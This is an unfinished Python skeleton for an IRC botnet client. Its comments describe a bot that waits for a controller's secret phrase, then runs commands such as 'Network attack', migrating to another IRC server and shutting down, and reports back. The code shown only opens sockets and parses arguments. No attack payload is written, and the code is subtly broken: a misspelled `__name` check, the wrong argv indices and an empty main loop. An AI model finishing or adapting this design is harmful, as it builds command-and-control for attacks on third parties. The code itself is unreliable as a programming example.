import time
import socket
import sys
import random 

HOST = None
PORT = None 
CHANNEL = None 
PHRASE = None 
IRC = None


# BOT TODO
# Listen on channel and detect secret phrase from controller
# Execute commands sent by controller to channel
# Commands: Network attack, migration to different IRC, ShutDown
# Report status of command execution to controller


# GET COMMANDS FROM CONTROLLER
def getCommand(conSocket):
    msg = conSocket.recv(1024).decode('utf-8', 'ignore').strip()



# CONNECT TO IRC SERVER CHANNEL
# This next line goes to a function
# ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def serverConnect(ircSocket, host, port):
    try:
        ircSocket.connect((host,port))
        print("Connection successful")
    except:
        print("Connection failed")





if __name == "__main__":

    # Get sys.args
    if len(sys.argv) != 4:
        print("Wrong number of inputs")
        sys.exit()

    HOST = sys.argv[0]
    PORT = sys.argv[1]
    CHANNEL = sys.argv[2]
    PHRASE = sys.argv[3]

    if not PORT.isdigit():
        print("Invalid port")
        sys.exit()

    # Keep Connection to IRC Server
    while True:
        ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Do connection stuff

        

        


